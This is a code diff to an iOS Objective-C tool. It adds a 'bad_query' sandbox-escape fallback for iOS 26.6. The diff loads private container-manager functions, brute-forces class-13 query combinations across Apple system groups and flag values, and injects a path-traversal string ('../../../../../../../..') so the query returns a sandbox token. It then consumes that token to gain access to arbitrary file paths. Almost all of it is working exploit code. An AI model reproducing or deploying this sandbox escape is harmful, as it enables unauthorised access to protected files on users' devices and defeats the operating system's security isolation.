@@ -592,6 +592,81 @@ static NSString *BadQueryCodeText(int64_t code)
     }
 }
 
+// Consume a sandbox extension using an explicit class-13 combo (group, flags,
+// part, traversal). This is the matrix-verified path used when the canonical
+// bad_query flags are blocked at token issuance on iOS 26.6.
+static int64_t BadQueryConsumeCombo(NSString *targetPath, NSString *group,
+                                    uint64_t flags, uint64_t part, BOOL traversal)
+{
+    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
+                       RTLD_NOW | RTLD_LOCAL);
+    if (!mgr) return -1;
+    void *(*query_create)(void) = dlsym(mgr, "container_query_create");
+    void (*query_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
+    void (*query_set_group_identifiers)(void *, xpc_object_t) =
+        dlsym(mgr, "container_query_set_group_identifiers");
+    void (*query_set_flags)(void *, uint64_t) =
+        dlsym(mgr, "container_query_operation_set_flags");
+    void (*query_set_part)(void *, uint64_t) =
+        dlsym(mgr, "container_query_operation_set_part");
+    void (*query_set_part_domain)(void *, const char *) =
+        dlsym(mgr, "container_query_operation_set_part_domain");
+    void *(*query_get_single_result)(void *) =
+        dlsym(mgr, "container_query_get_single_result");
+    void (*query_free)(void *) = dlsym(mgr, "container_query_free");
+    char *(*copy_sandbox_token)(void *) = dlsym(mgr, "container_copy_sandbox_token");
+    int64_t (*consume_extension)(const char *) =
+        (int64_t (*)(const char *))dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+    if (!query_create || !query_set_class || !query_set_group_identifiers ||
+        !query_set_flags || !query_set_part || !query_set_part_domain ||
+        !query_get_single_result || !query_free || !copy_sandbox_token ||
+        !consume_extension) {
+        dlclose(mgr);
+        return -1;
+    }
+    void *query = query_create();
+    if (!query) {
+        dlclose(mgr);
+        return -2;
+    }
+    query_set_class(query, 13);
+    xpc_object_t identifier = xpc_string_create(group.UTF8String);
+    query_set_group_identifiers(query, identifier);
+    query_set_part(query, part);
+    if (traversal) {
+        NSString *traversalPath =
+            [NSString stringWithFormat:@"../../../../../../../..%@", targetPath];
+        query_set_part_domain(query, traversalPath.UTF8String);
+    }
+    query_set_flags(query, flags);
+    void *queryResult = query_get_single_result(query);
+    if (!queryResult) {
+#if !OS_OBJECT_USE_OBJC
+        xpc_release(identifier);
+#endif
+        query_free(query);
+        dlclose(mgr);
+        return -3;
+    }
+    char *token = copy_sandbox_token(queryResult);
+    if (!token) {
+#if !OS_OBJECT_USE_OBJC
+        xpc_release(identifier);
+#endif
+        query_free(query);
+        dlclose(mgr);
+        return -4;
+    }
+    int64_t handle = consume_extension(token);
+    free(token);
+#if !OS_OBJECT_USE_OBJC
+    xpc_release(identifier);
+#endif
+    query_free(query);
+    dlclose(mgr);
+    return handle;
+}
+
 int64_t BadQueryConsumePath(NSString *path, NSString *groupIdentifier,
                             BOOL isGroup, NSString **error)
 {
@@ -610,7 +685,57 @@ int64_t BadQueryConsumePath(NSString *path, NSString *groupIdentifier,
     int64_t handle = bad_query(pathBuffer, false, groupBuffer, isGroup);
     free(pathBuffer);
     free(groupBuffer);
-    if (handle < 0 && error)
+    if (handle >= 0) {
+        FFLogTag(@"BadQueryProbe", @"consume OK canonical path=%@ handle=%lld",
+            path, handle);
+        return handle;
+    }
+
+    // iOS 26.6 fallback: the canonical flags issue no token, but the variant
+    // matrix proves class-13 combos still do. Try target-traversal combos
+    // first so the handle actually covers the requested path.
+    if (!groupIdentifier && !isGroup) {
+        static NSArray<NSDictionary *> *combos;
+        static dispatch_once_t onceToken;
+        dispatch_once(&onceToken, ^{
+            NSArray<NSString *> *groups = @[
+                @"systemgroup.com.apple.mobilegestaltcache",
+                @"systemgroup.com.apple.lsd.iconscache",
+                @"systemgroup.com.apple.configurationprofiles",
+                @"systemgroup.com.apple.installcoordinationd",
+            ];
+            NSArray<NSNumber *> *flags = @[
+                @(0x900000000ULL),
+                @(0x800000000ULL),
+                @(0x8100000000ULL),
+                @(0x080000000ULL),
+            ];
+            NSArray<NSNumber *> *parts = @[@0, @3];
+            NSMutableArray *all = [NSMutableArray array];
+            for (NSString *group in groups)
+                for (NSNumber *flag in flags)
+                    for (NSNumber *part in parts)
+                        for (NSNumber *traversal in @[@YES, @NO])
+                            [all addObject:@{@"Group": group, @"Flags": flag,
+                                             @"Part": part, @"Traversal": traversal}];
+            combos = all;
+        });
+        for (NSDictionary *combo in combos) {
+            int64_t matrixHandle = BadQueryConsumeCombo(path, combo[@"Group"],
+                [combo[@"Flags"] unsignedLongLongValue],
+                [combo[@"Part"] unsignedLongLongValue],
+                [combo[@"Traversal"] boolValue]);
+            if (matrixHandle >= 0) {
+                FFLogTag(@"BadQueryProbe",
+                    @"consume OK matrix path=%@ group=%@ flags=0x%llx part=%@ traversal=%@ handle=%lld",
+                    path, combo[@"Group"],
+                    [combo[@"Flags"] unsignedLongLongValue],
+                    combo[@"Part"], combo[@"Traversal"], matrixHandle);
+                return matrixHandle;
+            }
+        }
+    }
+    if (error)
         *error = [NSString stringWithFormat:@"bad_query failed (code=%lld: %@)",
             handle, BadQueryCodeText(handle)];
     return handle;
